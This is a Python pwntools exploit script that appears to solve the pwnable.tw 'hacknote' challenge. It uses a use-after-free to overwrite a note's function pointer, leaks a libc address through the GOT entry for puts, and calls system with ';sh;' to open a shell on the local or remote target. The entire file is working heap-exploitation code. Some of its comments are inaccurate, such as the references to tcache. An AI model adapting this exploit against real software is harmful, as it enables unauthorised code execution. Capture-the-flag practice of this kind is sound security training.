#!/usr/bin/env python3

from pwn import *

DUMMY = lambda x: b"b" * x

elf = ELF("./hacknote_patched")
libc = ELF("./given/libc_32.so.6")
ld = ELF("./ld-2.23.so")

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10102)
    else:
        p = process([ld.path, elf.path],
                    env={"LD_PRELOAD": libc.path})
        if args.D:
            gdb.attach(p)
    return p

chunk_pool = [False, False, False, False, False, False]

def alloc_note(content, p):
    """
    malloc(8) for metadata
    malloc(size) for content
    """
    p.recvuntil(b"Your choice :")
    p.sendline(b"1")
    p.recvuntil(b"Note size :")
    p.sendline(str(len(content)).encode())
    p.recvuntil(b"Content :")
    p.send(content)
    p.recvuntil(b"Success !")

    i = chunk_pool.index(False)
    if i < -1:
        print("This program allows you to alloc 5 times")
        quit()
    chunk_pool[i] = True
    return i

def free_note(index, p):
    p.recvuntil(b"Your choice :")
    p.sendline(b"2")
    p.recvuntil(b"Index :")
    p.sendline(str(index).encode())
    p.recvuntil(b"Success")

def print_note(index, p):
    p.recvuntil(b"Your choice :")
    p.sendline(b"3")
    p.recvuntil(b"Index :")
    p.sendline(str(index).encode())

def prepare_overwrite_metadata(p):
    a = alloc_note(DUMMY(8), p) # m(8), m(8)
    b = alloc_note(DUMMY(32), p) # m(8), m(32)

    free_note(a, p) # free(a_content), free(a_meta)
    free_note(b, p) # free(b_content), free()
    # Now, the tcache list:
    #  b_content -> a_meta -> a_content
    # next alloc_note() with size 8 would be:

    # a_metadata will be overwritten
    return a

def func_ptr_overwrite(print_func, content, overwritten_note_id, p):
    """
    The metadata has the following structure:
    struct Note {
        (*void)(char*)() print_func;
        char* content;
    };
    And in the print note function, it has
    ```note.print_func(&note);```
    However, this is vulnerability restrict our choice of arguemnt.
    Note that the arg0 is print_func itself and the 'content' is not the second argument but arg0 + 4
    In conclusion, there are some use cases are possible:
    1) use the default print_func 0x804862b, which puts() the note->content.
    2) use any function that takes in only one argument: this has a drawback that the first argument must be print_func itself.
       see libc_pop_shell
    """
    new_note = alloc_note(p32(print_func) + p32(content), p)
    print_note(overwritten_note_id, p)
    return new_note

def leak_libc(overwritten_note_id, p):
    # info: objdump
    func_puts_content = 0x804862b
    got_puts = 0x804a024

    new_note = func_ptr_overwrite(func_puts_content, got_puts, overwritten_note_id, p)

    leak = p.recvn(4)
    libc_puts = u32(leak)
    print("libc leak:", hex(libc_puts))
    libc.address = libc_puts - libc.symbols['puts']

    # free the new note so that we can reuse this metadata overwrite
    free_note(new_note, p)


def libc_pop_shell(note_id, p):
    """
    Because the func_ptr_overwrite has limited behavior, the libc __
    """
    func_ptr_overwrite(libc.symbols['system'], u32(b";sh;"), note_id, p)

def exploit():
    p = conn()
    note_id = prepare_overwrite_metadata(p)
    leak_libc(note_id, p)
    libc_pop_shell(note_id, p)

    p.interactive()


if __name__ == "__main__":
    exploit()
